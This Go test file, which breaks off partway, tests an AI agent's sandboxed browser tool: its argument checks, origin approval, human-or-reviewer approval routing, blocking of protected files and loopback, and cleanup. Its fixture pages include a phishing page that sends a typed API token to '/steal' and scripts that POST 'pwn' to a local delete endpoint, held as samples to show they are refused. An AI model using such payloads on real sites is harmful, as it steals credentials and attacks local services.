package tools

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/netip"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"testing"
	"time"

	"jarvis/internal/browser"
	"jarvis/internal/core"
)

// browserSite serves the pages the Browser tests drive on loopback, and
// stands in for one origin beyond it, http://external.test, which the
// browser reaches only once it is approved.
type browserSite struct {
	local, external *httptest.Server
	mu              sync.Mutex
	hits            map[string]int
}

func newBrowserSite(t *testing.T) *browserSite {
	t.Helper()
	s := &browserSite{hits: map[string]int{}}
	page := func(title, body string) string {
		return "<!doctype html><meta charset=utf-8><title>" + title + "</title>" + body
	}
	s.local = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		s.hit("local" + r.URL.Path)
		switch r.URL.Path {
		case "/":
			io.WriteString(w, page("Home", `<h1>Home</h1><a href="/form">Form</a>
<img src="http://external.test/pixel.svg" alt="Remote pixel" id=remote>
<script>console.error("local boom")</script>`))
		case "/form":
			io.WriteString(w, page("Form", `<h1>Profile</h1><label>Email <input id=email></label>
<button onclick="out.textContent = 'Saved ' + email.value">Save</button><p id=out></p>
<label>Avatar <input type=file id=avatar onchange="out.textContent = [...avatar.files].map(f => f.name + ' ' + f.size).join()"></label>`))
		case "/out":
			http.Redirect(w, r, "http://external.test/landing", http.StatusFound)
		case "/hang":
			<-r.Context().Done()
		case "/long":
			var rows strings.Builder
			for i := range 1500 {
				fmt.Fprintf(&rows, "<li>Row %d of the long list</li>", i)
			}
			io.WriteString(w, page("Long", `<h1>Long</h1><ul>`+rows.String()+`</ul><button id=last onclick="out.textContent = 'last clicked'">Last</button><p id=out role=status></p>`))
		case "/shop":
			io.WriteString(w, page("Shop", `<header><a href="/">Home</a></header><main><h1>Groceries</h1><form><label>Item <input></label><button type=button>Add</button></form>
<ul><li>Milk</li><li>Bread</li><li>Eggs</li></ul><button onclick="d.showModal()">Settings</button><button>Checkout</button></main>
<footer>We use cookies</footer><dialog id=d aria-labelledby=dt><h2 id=dt>Settings</h2><label><input type=checkbox> Dark mode</label><button onclick="d.close()">Close</button></dialog>`))
		case "/embed":
			io.WriteString(w, page("Embed", `<h1>Dev app</h1><iframe src="http://external.test/frame-post"></iframe>`))
		case "/api/delete", "/hmr":
		case "/downloads":
			io.WriteString(w, page("Downloads", `<a href="/download">Get report</a>`))
		case "/download":
			w.Header().Set("Content-Disposition", `attachment; filename="report.csv"`)
			io.WriteString(w, "a,b\n1,2\n")
		default:
			http.NotFound(w, r)
		}
	}))
	s.external = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		s.hit("external" + r.URL.Path)
		switch r.URL.Path {
		case "/pixel.svg":
			w.Header().Set("Content-Type", "image/svg+xml")
			io.WriteString(w, `<svg xmlns="http://www.w3.org/2000/svg" width="7" height="7"/>`)
		case "/landing", "/":
			io.WriteString(w, page("Outside", `<h1>Outside</h1><input aria-label=Search><button>Go</button>`))
		case "/popup-reach":
			// A popup at about:blank has its opener's origin, and its requests are its opener's.
			io.WriteString(w, page("Popup", `<h1>Popup</h1><p id=r>…</p><script>
const w = window.open(); setTimeout(() => w.fetch('`+s.local.URL+`/form?popup').then(() => r.textContent = 'reached', () => r.textContent = 'refused'), 1000)</script>`))
		case "/frame-post":
			// An approved widget inside the dev app, trying its API.
			io.WriteString(w, page("Widget", `<p id=r>…</p><script>fetch('`+s.local.URL+`/api/delete?fromframe', {method: 'POST', mode: 'no-cors', body: 'pwn'}).then(() => r.textContent = 'reached', () => r.textContent = 'refused')</script>`))
		case "/ws-reach":
			io.WriteString(w, page("Socket", `<p id=r>…</p><script>const ws = new WebSocket('`+strings.Replace(s.local.URL, "http", "ws", 1)+`/hmr'); ws.onopen = () => r.textContent = 'open'; ws.onerror = () => r.textContent = 'refused'</script>`))
		case "/phish":
			// A popup it writes into, and reads back.
			io.WriteString(w, page("Phish", `<h1>Docs</h1><script>
const w = window.open(); w.document.write('<label>API token <input id=t></label>');
setInterval(() => { const v = w.document.getElementById('t').value; if (v) fetch('/steal?v=' + encodeURIComponent(v)) }, 100)</script>`))
		case "/reach-in":
			// An outside page trying the dev server, by fetch and by iframe.
			io.WriteString(w, page("Reach", `<h1>Reach</h1><p id=r>…</p><iframe src="`+s.local.URL+`/form?framed"></iframe><script>
fetch('`+s.local.URL+`/form?fetched').then(() => r.textContent = 'reached', () => r.textContent = 'refused')</script>`))
		default:
			http.NotFound(w, r)
		}
	}))
	t.Cleanup(func() {
		s.local.Close()
		s.external.Close()
	})
	return s
}

func (s *browserSite) hit(path string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.hits[path]++
}

func (s *browserSite) count(path string) int {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.hits[path]
}

// browserFixture is an executor whose Browser uses the Chrome this machine
// has, skipping the test when there is none, and reaches
// http://external.test through site once that origin is approved.
func browserFixture(t *testing.T, mode string, approve core.Approver, site *browserSite) *Executor {
	t.Helper()
	if _, err := browser.Find(os.Getenv("JARVIS_BROWSER")); err != nil {
		t.Skip("no Chrome to test with: " + err.Error())
	}
	e, err := New(Config{Directory: t.TempDir(), Mode: mode, Approve: approve, Browser: os.Getenv("JARVIS_BROWSER"), ScratchDir: filepath.Join(t.TempDir(), "scratch")})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { e.Close() })
	if site != nil {
		local, _ := url.Parse(site.local.URL)
		port, _ := strconv.Atoi(local.Port())
		e.browserState().testPorts = []int{port}
		external := strings.TrimPrefix(site.external.URL, "http://")
		e.browserState().testDial = func(ctx context.Context, address string) (net.Conn, error) {
			if address != "external.test:80" {
				return nil, fmt.Errorf("no route to %s in this test", address)
			}
			var d net.Dialer
			return d.DialContext(ctx, "tcp", external)
		}
	}
	return e
}

func browse(t *testing.T, e core.ToolExecutor, args map[string]any) core.ToolResult {
	t.Helper()
	b, _ := json.Marshal(args)
	return e.Execute(context.Background(), core.ToolCall{ID: "call", Name: "Browser", Arguments: b})
}

func mustBrowse(t *testing.T, e core.ToolExecutor, args map[string]any) core.ToolResult {
	t.Helper()
	r := browse(t, e, args)
	if r.IsError {
		t.Fatalf("%v: %s", args, r.Content)
	}
	return r
}

// Arguments are checked before anything starts or is put to anyone, and no
// action but navigate starts Chrome.
func TestBrowserArguments(t *testing.T) {
	e, _ := fixture(t, "ask", func(context.Context, core.Approval) (core.Decision, error) {
		t.Error("invalid arguments reached approval")
		return core.Decision{}, nil
	})
	for _, tc := range []struct {
		args map[string]any
		want string
	}{
		{map[string]any{"action": "open"}, "action must be one of"},
		{map[string]any{"action": "tabs", "bogus": 1}, "invalid arguments"},
		{map[string]any{"action": "navigate"}, "navigate needs a url"},
		{map[string]any{"action": "click"}, "click needs a target"},
		{map[string]any{"action": "click", "target": "e1", "text": "x"}, "text does not apply to click"},
		{map[string]any{"action": "click", "target": "e1", "network": true}, "network does not apply to click"},
		{map[string]any{"action": "navigate", "url": "http://localhost", "target": "e1"}, "target does not apply to navigate"},
		{map[string]any{"action": "press", "keys": []string{"hyper+x"}}, "unknown modifier"},
		{map[string]any{"action": "press"}, "press needs keys"},
		{map[string]any{"action": "wait", "text": "a", "selector": "b"}, "wait for one thing"},
		{map[string]any{"action": "wait", "network_idle": true, "gone": true}, "gone applies"},
		{map[string]any{"action": "emulate"}, "emulate needs"},
		{map[string]any{"action": "allow"}, "allow needs"},
		{map[string]any{"action": "allow", "origins": []string{"ftp://example.com"}}, "not an http or https origin"},
		{map[string]any{"action": "snapshot", "page": "x1"}, "is not a page"},
		{map[string]any{"action": "tabs", "page": "p1"}, "page does not apply to tabs"},
		{map[string]any{"action": "wait", "text": "a", "timeout": 61}, "timeout must be"},
		{map[string]any{"action": "drag", "target": "e1"}, "drag needs to"},
		{map[string]any{"action": "upload", "target": "e1", "paths": []string{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k"}}, "between 1 and 10 paths"},
		{map[string]any{"action": "eval", "script": " "}, "eval needs a script"},
		{map[string]any{"action": "select", "target": "e1"}, "select needs values"},
		{map[string]any{"action": "click", "target": "  "}, "target is empty"},
		{map[string]any{"action": "navigate", "url": "example.com"}, "for a web address give its scheme, such as https://example.com"},
		{map[string]any{"action": "navigate", "url": "../outside.html"}, "parent traversal"},
		{map[string]any{"action": "navigate", "url": ".env"}, "protected"},
		{map[string]any{"action": "navigate", "url": "https://example.com"}, "navigate with network=true to ask for https://example.com"},
		{map[string]any{"action": "click", "target": "e1"}, "no page is open: navigate first"},
		{map[string]any{"action": "console"}, "no page is open: navigate first"},
	} {
		r := browse(t, e, tc.args)
		if !r.IsError || !strings.Contains(r.Content, tc.want) {
			t.Errorf("%v: %+v, want an error mentioning %q", tc.args, r, tc.want)
		}
	}
	if r := browse(t, e, map[string]any{"action": "tabs"}); r.IsError || r.Content != "No pages are open." {
		t.Fatalf("tabs: %+v", r)
	}
	if e.browsing != nil && e.browsing.b != nil {
		t.Fatal("an action other than navigate started Chrome")
	}
	ro, _ := fixture(t, "read-only", nil)
	for _, action := range []map[string]any{{"action": "navigate", "url": "http://localhost:1"}, {"action": "snapshot"}, {"action": "allow", "origins": []string{"https://example.com"}}} {
		if r := browse(t, ro, action); !r.IsError || !strings.Contains(r.Content, "read-only mode prohibits using the browser") {
			t.Errorf("read-only %v: %+v", action, r)
		}
	}
	if r := browse(t, ro, map[string]any{"action": "tabs"}); r.IsError {
		t.Errorf("read-only tabs: %s", r.Content)
	}
}

func TestBrowserOrigins(t *testing.T) {
	for raw, want := range map[string]string{
		"HTTPS://Example.COM:443/docs?q=1": "https://example.com",
		"http://example.com:80":            "http://example.com",
		"http://example.com:8080/x":        "http://example.com:8080",
		"ws://chat.test/socket":            "http://chat.test",
		"wss://chat.test:443/":             "https://chat.test",
		"http://[::1]:5173/":               "http://[::1]:5173",
		"https://example.com./":            "https://example.com",
	} {
		u, _ := url.Parse(raw)
		if got, ok := browserOrigin(u); !ok || got != want {
			t.Errorf("origin of %s = %q, want %q", raw, got, want)
		}
	}
	for _, raw := range []string{"file:///tmp/x", "data:text/plain,x", "about:blank", "ftp://example.com"} {
		u, _ := url.Parse(raw)
		if got, ok := browserOrigin(u); ok {
			t.Errorf("%s has origin %q", raw, got)
		}
	}
	for host, want := range map[string]bool{"localhost": true, "LOCALHOST.": true, "app.localhost": true, "127.0.0.1": true, "127.8.9.1": true, "[::1]": true, "::ffff:127.0.0.1": true, "0.0.0.0": false, "localhost.example.com": false, "10.0.0.1": false} {
		if loopbackHost(host) != want {
			t.Errorf("loopbackHost(%s) = %v", host, !want)
		}
	}
	for ip, want := range map[string]bool{"93.184.215.14": true, "2606:4700::1111": true, "10.1.2.3": false, "192.168.8.1": false, "172.16.0.1": false, "127.0.0.1": false, "169.254.169.254": false, "100.100.1.1": false, "::1": false, "fe80::1": false, "fd00::1": false, "::ffff:10.0.0.1": false, "0.0.0.0": false, "224.0.0.1": false, "198.18.0.1": false, "198.19.255.1": false, "192.0.2.1": false, "203.0.113.9": false, "240.0.0.1": false, "2001:db8::1": false, "64:ff9b::a00:1": false, "64:ff9b::5db8:d70e": true, "2002:a00:1::1": false} {
		if publicAddress(netip.MustParseAddr(ip)) != want {
			t.Errorf("publicAddress(%s) = %v", ip, !want)
		}
	}
}

// The request policy, request by request: where it goes, whose request it is,
// and what was approved.
func TestBrowserPolicy(t *testing.T) {
	workspace, scratch := t.TempDir(), t.TempDir()
	st := &browserState{origins: map[string]bool{"https://docs.example.com": true, "http://plain.example.com": true, "http://localhost:6379": true},
		roots: []fileRoot{{workspace, workspace}, {scratch, scratch}, {scratch, "/var/alias/scratch"}}, ports: []int{80, 5173, 8080}}
	const page = "http://localhost:5173/app"
	for _, tc := range []struct {
		url, from string
		main      bool
		method    string
		want      string // "" allows
	}{
		{"http://localhost:5173/api", page, false, "GET", ""},
		{"http://127.0.0.1:8080/", "", true, "GET", ""},
		{"ws://[::1]:5173/hmr", page, false, "GET", ""},
		{"http://dev.localhost/", page, false, "POST", ""},
		// Loopback servers the terminals did not start are the machine's own.
		{"http://localhost:5432/", page, false, "POST", "not a server your terminals started"},
		{"http://127.0.0.1:9000/", "", true, "GET", "not a server your terminals started"},
		{"ws://localhost:9222/devtools", page, false, "GET", "not a server your terminals started"},
		{"http://localhost:6379/", page, false, "POST", ""},
		{"https://cdn.example.net/lib.js", page, false, "GET", "https://cdn.example.net is not approved for this turn"},
		{"https://docs.example.com/guide", page, true, "GET", ""},
		{"wss://docs.example.com/live", page, false, "GET", ""},
		{"http://docs.example.com/guide", page, true, "GET", "http://docs.example.com is not approved"},
		{"https://docs.example.com:8443/", page, true, "GET", "https://docs.example.com:8443 is not approved"},
		{"ws://plain.example.com/socket", page, false, "GET", ""},
		{"http://0.0.0.0:5173/", "", true, "GET", "use localhost"},
		// An approved outside page cannot use local servers, except by navigating to them.
		{"http://localhost:5173/api", "https://docs.example.com/guide", false, "GET", "a page from https://docs.example.com may not reach local servers"},
		{"http://localhost:5173/frame", "https://docs.example.com/guide", false, "GET", "may not reach local servers"},
		{"http://localhost:5173/", "https://docs.example.com/guide", true, "GET", ""},
		{"http://localhost:5173/delete", "https://docs.example.com/guide", true, "POST", "may not reach local servers"},
		{"http://localhost:5173/api", "blob:https://docs.example.com/5f0c", false, "GET", "a page from https://docs.example.com may not reach local servers"},
		{"http://localhost:5173/api", "blob:http://localhost:5173/5f0c", false, "GET", ""},
		{"data:text/html,<p>x", page, false, "GET", ""},
		{"blob:http://localhost:5173/1234", page, false, "GET", ""},
		{"file://" + workspace + "/dist/index.html", "", true, "GET", ""},
		{"file://" + workspace + "/dist/../../escape.html", "", true, "GET", "outside the workspace"},
		{"file://" + workspace + "/.env", "", true, "GET", "protected"},
		{"file://" + workspace + "/sub/.git/config", "", true, "GET", "protected"},
		{"file://" + workspace + "/keys/server.pem", "", true, "GET", "protected"},
		{"file://" + scratch + "/report.html", "", true, "GET", ""},
		{"file:///var/alias/scratch/report.html", "", true, "GET", ""},
		{"file:///etc/hosts", "", true, "GET", "outside the workspace and $JARVIS_SCRATCH"},
		{"file://" + workspace + "/index.html", "https://docs.example.com/", true, "GET", "may not open local files"},
		{"ftp://example.com/file", "", true, "GET", "ftp: URLs are not available"},
	} {
		u, err := url.Parse(tc.url)
		if err != nil {
			t.Fatal(err)
		}
		d := st.decide(browser.Request{URL: u, Method: tc.method, From: tc.from, MainFrame: tc.main, Navigation: tc.main})
		if tc.want == "" && !d.Allow || tc.want != "" && (d.Allow || !strings.Contains(d.Reason, tc.want)) {
			t.Errorf("%s from %q (main %v, %s): %+v, want %q", tc.url, tc.from, tc.main, tc.method, d, tc.want)
		}
	}
}

// The proxy's dial opens approved origins only, and an approved name only at
// a public address.
func TestBrowserDial(t *testing.T) {
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer listener.Close()
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				return
			}
			conn.Close()
		}
	}()
	_, port, _ := net.SplitHostPort(listener.Addr().String())
	st := &browserState{origins: map[string]bool{"http://127.0.0.1:" + port: true, "http://localhost:" + port: true, "https://example.com": true}}
	ctx := context.Background()
	if _, err := st.dial(ctx, "elsewhere.test:443"); err == nil || !strings.Contains(err.Error(), "not approved") {
		t.Fatalf("an unapproved address: %v", err)
	}
	if _, err := st.dial(ctx, "example.com:80"); err == nil || !strings.Contains(err.Error(), "not approved") {
		t.Fatalf("an approved host on another port: %v", err)
	}
	// An address named itself is dialed as approved.
	conn, err := st.dial(ctx, "127.0.0.1:"+port)
	if err != nil {
		t.Fatal(err)
	}
	conn.Close()
	// A name is not, when it resolves to a private address.
	if _, err := st.dial(ctx, "localhost:"+port); err == nil || !strings.Contains(err.Error(), "a private address") {
		t.Fatalf("a name resolving to loopback: %v", err)
	}
}

// Who decides each action, by mode and by where the page is.
func TestBrowserApprovals(t *testing.T) {
	site := newBrowserSite(t)
	for _, mode := range []string{"auto", "ask"} {
		t.Run(mode, func(t *testing.T) {
			var asked, reviewed []core.Approval
			e := browserFixture(t, mode, func(_ context.Context, a core.Approval) (core.Decision, error) {
				asked = append(asked, a)
				return core.Decision{Allow: true}, nil
			}, site)
			e.config.Review = func(_ context.Context, a core.Approval) (core.Decision, error) {
				reviewed = append(reviewed, a)
				return core.Decision{Allow: true, Reason: "fixture"}, nil
			}
			check := func(args map[string]any, want string, contains ...string) core.ToolResult {
				t.Helper()
				asked, reviewed = nil, nil
				r := mustBrowse(t, e, args)
				got, approvals := "", append(asked, reviewed...)
				switch {
				case len(asked) > 0:
					got = "human"
				case len(reviewed) > 0:
					got = "reviewer"
				}
				if got != want || len(approvals) > 1 {
					t.Fatalf("%v went to %q (asked %d, reviewed %d), want %q", args, got, len(asked), len(reviewed), want)
				}
				for _, a := range approvals {
					// What the browser is, the reviewer's policy says; where the
					// page is, the arguments and the user's panel do: the reason
					// says neither again.
					var request browserRequest
					json.Unmarshal(a.Call.Arguments, &request)
					if a.Call.Name != "Browser" || a.ExecutionMode != "browser" || strings.Contains(a.Reason, "fresh profile") || request.PageURL != "" && strings.Contains(a.Reason, request.PageURL) {
						t.Fatalf("approval: %+v", a)
					}
					for _, part := range contains {
						if !strings.Contains(string(a.Call.Arguments), part) {
							t.Fatalf("%v: approval arguments lack %s: %s", args, part, a.Call.Arguments)
						}
					}
				}
				return r
			}
			human := map[string]string{"auto": "", "ask": "human"}[mode]
			review := map[string]string{"auto": "reviewer", "ask": "human"}[mode]
			form := site.local.URL + "/form"
			check(map[string]any{"action": "navigate", "url": form}, human, `"url":"`+form+`"`)
			check(map[string]any{"action": "type", "target": "e2", "text": "ada@example.com"}, human, `"target":"textbox \"Email\" (e2)"`, `"text":"ada@example.com"`, `"page_url":"`+form+`"`)
			check(map[string]any{"action": "click", "target": "e3"}, human, `"target":"button \"Save\" (e3)"`)
			for _, args := range []map[string]any{
				{"action": "hover", "target": "e3"}, {"action": "scroll"}, {"action": "snapshot"}, {"action": "screenshot"},
				{"action": "console"}, {"action": "tabs"}, {"action": "wait", "text": "Saved"}, {"action": "emulate", "color_scheme": "dark"},
			} {
				check(args, "")
			}
			check(map[string]any{"action": "eval", "script": "document.title"}, human, `"script":"document.title"`)
			check(map[string]any{"action": "reload"}, human)
			// Beyond loopback: the origin is approved once, then input sent there is reviewed.
			if r := browse(t, e, map[string]any{"action": "navigate", "url": "http://external.test/landing"}); !r.IsError || !strings.Contains(r.Content, "network=true") {
				t.Fatalf("an outside page without network: %s", r.Content)
			}
			r := check(map[string]any{"action": "navigate", "url": "http://external.test/landing", "network": true}, review, `"origins":["http://external.test"]`, `"url":"http://external.test/landing"`)
			if !strings.Contains(r.Content, `heading "Outside"`) {
				t.Fatalf("the approved page did not load:\n%s", r.Content)
			}
			search, button := ref(t, r.Content, `textbox "Search"`), ref(t, r.Content, `button "Go"`)
			check(map[string]any{"action": "type", "target": search, "text": "query"}, review, `"page_url":"http://external.test/landing"`, `"text":"query"`)
			check(map[string]any{"action": "press", "keys": []string{"Enter"}}, review, `"keys":["Enter"]`)
			check(map[string]any{"action": "eval", "script": "1+1"}, review, `"script":"1+1"`)
			check(map[string]any{"action": "click", "target": button}, human)
			check(map[string]any{"action": "navigate", "url": "http://external.test/"}, human)
			check(map[string]any{"action": "allow", "origins": []string{"http://external.test/whatever"}}, "")
			check(map[string]any{"action": "allow", "origins": []string{"https://fonts.example.org", site.local.URL}}, review, `"origins":["https://fonts.example.org"]`, `"page_url":"http://external.test/"`)
			// A loopback server no terminal started is the machine's own.
			check(map[string]any{"action": "allow", "origins": []string{"http://localhost:3000"}}, review, `"origins":["http://localhost:3000"]`)
			if r := mustBrowse(t, e, map[string]any{"action": "tabs"}); !strings.Contains(r.Content, "Approved this turn: http://external.test, http://localhost:3000, https://fonts.example.org") {
				t.Fatalf("tabs: %s", r.Content)
			}
		})
	}
}

// ref finds the ref a snapshot gave the element it names as line.
func ref(t *testing.T, snapshot, line string) string {
	t.Helper()
	m := regexp.MustCompile(regexp.QuoteMeta(line) + ` \[ref=(e\d+)\]`).FindStringSubmatch(snapshot)
	if m == nil {
		t.Fatalf("no %s in:\n%s", line, snapshot)
	}
	return m[1]
}

// A denied approval leaves nothing approved and nothing loaded.
func TestBrowserDenial(t *testing.T) {
	site := newBrowserSite(t)
	e := browserFixture(t, "auto", nil, site)
	e.config.Review = func(context.Context, core.Approval) (core.Decision, error) {
		return core.Decision{Reason: "not for this task"}, nil
	}
	r := browse(t, e, map[string]any{"action": "navigate", "url": "http://external.test/landing", "network": true})
	if !r.IsError || !strings.Contains(r.Content, "automatic review denied") || site.count("external/landing") != 0 {
		t.Fatalf("denied navigation: %+v", r)
	}
	if e.browsing.approved("http://external.test") || e.browsing.b != nil {
		t.Fatal("a denied origin was approved, or Chrome started for nothing")
	}
}

// Requests are policed end to end, in a real browser.
func TestBrowserRequestPolicy(t *testing.T) {
	site := newBrowserSite(t)
	e := browserFixture(t, "auto", nil, site)
	e.config.Review = func(context.Context, core.Approval) (core.Decision, error) {
		return core.Decision{Allow: true, Reason: "fixture"}, nil
	}
	// A loopback page's outside subresource is blocked, with a note saying how to ask.
	r := mustBrowse(t, e, map[string]any{"action": "navigate", "url": site.local.URL + "/"})
	for _, want := range []string{"blocked GET http://external.test/pixel.svg (image): http://external.test is not approved for this turn; Browser allow asks for it", "Console errors:\n- error local boom"} {
		if !strings.Contains(r.Content, want) {
			t.Errorf("navigate lacks %q:\n%s", want, r.Content)
		}
	}
	if strings.Contains(r.Content, "inspector") || strings.Contains(r.Content, "favicon") {
		t.Errorf("navigate repeats the blocked request or a missing favicon:\n%s", r.Content)
	}
	// A redirect out is blocked too.
	if r := browse(t, e, map[string]any{"action": "navigate", "url": site.local.URL + "/out"}); !r.IsError || !strings.Contains(r.Content, "blocked") {
		t.Errorf("redirect out: %s", r.Content)
	}
	// Files: the workspace and scratch directory only, never through a symlink or to a protected path.
	outside := filepath.Join(t.TempDir(), "outside.svg")
	os.WriteFile(outside, []byte(`<svg xmlns="http://www.w3.org/2000/svg" width="9" height="9"/>`), 0o644)
	os.Symlink(outside, filepath.Join(e.directory, "link.svg"))
	os.WriteFile(filepath.Join(e.directory, "ok.svg"), []byte(`<svg xmlns="http://www.w3.org/2000/svg" width="5" height="5"/>`), 0o644)
	os.WriteFile(filepath.Join(e.directory, ".env"), []byte("SECRET=1"), 0o600)
	os.MkdirAll(filepath.Join(e.directory, "dist"), 0o755)
	os.WriteFile(filepath.Join(e.directory, "dist", "index.html"), []byte(`<!doctype html><title>Built</title><h1>Built</h1>
<img src="../ok.svg" id=ok alt=ok><img src="../link.svg" id=link alt=link><img src="file:///etc/hosts" alt=hosts><iframe src="../.env"></iframe>`), 0o644)
	r = mustBrowse(t, e, map[string]any{"action": "navigate", "url": "dist/index.html"})
	for _, want := range []string{`heading "Built"`, "link.svg (image): symlink paths are forbidden", "file:///etc/hosts (image): outside the workspace", ".env (document): protected credential"} {
		if !strings.Contains(r.Content, want) {
			t.Errorf("file page lacks %q:\n%s", want, r.Content)
		}
	}
	if got := mustBrowse(t, e, map[string]any{"action": "eval", "script": "[ok.naturalWidth, link.naturalWidth].join(' ')"}); !strings.Contains(got.Content, `"5 0"`) {
		t.Errorf("image widths: %s", got.Content)
	}
	if r := browse(t, e, map[string]any{"action": "navigate", "url": "file:///etc/hosts"}); !r.IsError || !strings.Contains(r.Content, "outside the workspace") {
		t.Errorf("navigate outside: %s", r.Content)
	}
	// Approving the origin lets the page's subresource load.
	if site.count("external/pixel.svg") != 0 {
		t.Fatal("a blocked request reached the outside server")
	}
	mustBrowse(t, e, map[string]any{"action": "navigate", "url": site.local.URL + "/"})
	mustBrowse(t, e, map[string]any{"action": "allow", "origins": []string{"http://external.test"}})
	mustBrowse(t, e, map[string]any{"action": "reload"})
	if got := mustBrowse(t, e, map[string]any{"action": "eval", "script": "remote.naturalWidth"}); !strings.Contains(got.Content, "\n7\n") || site.count("external/pixel.svg") != 1 {
		t.Errorf("after approval: %s (hits %d)", got.Content, site.count("external/pixel.svg"))
	}
	// An approved outside page still cannot reach the dev server.
	r = mustBrowse(t, e, map[string]any{"action": "navigate", "url": "http://external.test/reach-in"})
	mustBrowse(t, e, map[string]any{"action": "wait", "text": "refused"})
	if site.count("local/form") != 0 || !strings.Contains(r.Content, "may not reach local servers") {
		t.Errorf("an outside page reached loopback (%d hits):\n%s", site.count("local/form"), r.Content)
	}
	mustBrowse(t, e, map[string]any{"action": "navigate", "url": "http://external.test/popup-reach"})
	if r := mustBrowse(t, e, map[string]any{"action": "wait", "text": "refused"}); site.count("local/form") != 0 {
		t.Errorf("an outside page's popup reached loopback:\n%s", r.Content)
	}
}

// Chrome starts on the first navigate, gives each agent its own pages, and
// is gone, process tree and profile, after Close.
func TestBrowserLifecycle(t *testing.T) {
	site := newBrowserSite(t)
	e := browserFixture(t, "auto", nil, site)
	if e.browsing.b != nil {
		t.Fatal("Chrome started before it was needed")
	}
	mustBrowse(t, e, map[string]any{"action": "navigate", "url": site.local.URL + "/form"})
	b := e.browsing.b
	pid, profile := b.PID(), b.ProfileDir()
	executor := WithSubagents(e, func(ctx context.Context, _ string, tools core.ToolExecutor) (string, error) {
		if r := browse(t, tools, map[string]any{"action": "snapshot", "page": "p1"}); !r.IsError {
			return "", errors.New("the child reached the parent's page")
		}
		if r := browse(t, tools, map[string]any{"action": "tabs"}); r.Content != "No pages are open." {
			return "", errors.New("child tabs: " + r.Content)
		}
		if r := browse(t, tools, map[string]any{"action": "navigate", "url": site.local.URL + "/"}); r.IsError || !strings.Contains(r.Content, "in p2.") {
			return "", errors.New("child navigate: " + r.Content)
		}
		return "ok", nil
	})
	if r := executor.Execute(context.Background(), core.ToolCall{Name: "Subagent", Arguments: json.RawMessage(`{"tasks":["look at the home page"]}`)}); r.IsError || strings.Contains(r.Content, `"error"`) {
		t.Fatal(r.Content)
	}
	if len(e.browsing.scopes) != 1 {
		t.Fatalf("the subagent's context outlived it: %d scopes", len(e.browsing.scopes))
	}
	if r := mustBrowse(t, e, map[string]any{"action": "tabs"}); !strings.HasPrefix(r.Content, "p1 · \"Form\"") || strings.Contains(r.Content, "p2") {
		t.Fatalf("tabs after the subagent: %s", r.Content)
	}
	// An upload is a private copy, removed with the browser.
	os.WriteFile(filepath.Join(e.directory, "avatar.png"), []byte("not really a png"), 0o644)
	r := mustBrowse(t, e, map[string]any{"action": "upload", "target": "css=#avatar", "paths": []string{"avatar.png"}})
	if !strings.Contains(r.Content, "avatar.png 16") {
		t.Fatalf("upload:\n%s", r.Content)
	}
	uploads := e.browsing.uploads
	for _, path := range []string{".env", "missing.png"} {
		os.WriteFile(filepath.Join(e.directory, ".env"), []byte("SECRET=1"), 0o600)
		if r := browse(t, e, map[string]any{"action": "upload", "target": "css=#avatar", "paths": []string{path}}); !r.IsError {
			t.Errorf("uploaded %s: %s", path, r.Content)
		}
	}
	e.Close()
	if err := syscall.Kill(pid, 0); !errors.Is(err, syscall.ESRCH) {
		t.Errorf("Chrome %d survived Close: %v", pid, err)
	}
	for _, dir := range []string{profile, uploads} {
		if _, err := os.Stat(dir); !os.IsNotExist(err) {
			t.Errorf("%s survived Close: %v", dir, err)
		}
	}
}

// Esc stops a navigation that would otherwise wait for a hanging server.
func TestBrowserCancel(t *testing.T) {
	site := newBrowserSite(t)
	e := browserFixture(t, "auto", nil, site)
	mustBrowse(t, e, map[string]any{"action": "navigate", "url": site.local.URL + "/"})
	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Millisecond)
	defer cancel()
	start := time.Now()
	r := e.Execute(ctx, core.ToolCall{Name: "Browser", Arguments: json.RawMessage(`{"action":"navigate","url":"` + site.local.URL + `/hang"}`)})
	if !r.IsError || time.Since(start) > 3*time.Second {
		t.Fatalf("a cancelled navigation took %v: %+v", time.Since(start), r)
	}
	// The page is still usable.
	mustBrowse(t, e, map[string]any{"action": "navigate", "url": site.local.URL + "/form"})
}

// Results show what changed, not the whole page again, and a screenshot
// when asked for.
func TestBrowserResults(t *testing.T) {
	site := newBrowserSite(t)
	e := browserFixture(t, "auto", nil, site)
	r := mustBrowse(t, e, map[string]any{"action": "navigate", "url": site.local.URL + "/form"})
	if !strings.HasPrefix(r.Content, "Opened "+site.local.URL+"/form in p1.\n\nPage p1: \"Form\"\nURL: ") || !strings.Contains(r.Content, `- button "Save" [ref=e3]`) {
		t.Fatalf("navigate:\n%s", r.Content)
	}
	r = mustBrowse(t, e, map[string]any{"action": "type", "target": "e2", "text": "ada@example.com", "image": true})
	if !strings.HasPrefix(r.Content, `Typed "ada@example.com" into textbox "Email" (e2).`) || !strings.Contains(r.Content, "Changes since the last snapshot of p1") || len(r.Images) != 1 || !strings.Contains(r.Content, "[screenshot: 1280×800 CSS px]") {
		t.Fatalf("type:\n%s", r.Content)
	}
	// Focus moving and a line added change most of so small a page: it is
	// shown whole rather than as a longer diff.
	r = mustBrowse(t, e, map[string]any{"action": "click", "target": "e3"})
	if !strings.Contains(r.Content, "\n- paragraph: Saved ada@example.com") || strings.Contains(r.Content, "Changes since") {
		t.Fatalf("click:\n%s", r.Content)
	}
	if r = mustBrowse(t, e, map[string]any{"action": "hover", "target": "e1"}); !strings.Contains(r.Content, "No change since the last snapshot of p1.") {
		t.Fatalf("hover:\n%s", r.Content)
	}
	r = mustBrowse(t, e, map[string]any{"action": "screenshot", "full_page": true})
	if len(r.Images) != 1 || !strings.HasPrefix(r.Content, `Screenshot of the full page in p1 "Form"`) {
		t.Fatalf("screenshot: %+v", r)
	}
	r = mustBrowse(t, e, map[string]any{"action": "emulate", "width": 390, "height": 844, "mobile": true, "scale": 2, "color_scheme": "dark"})
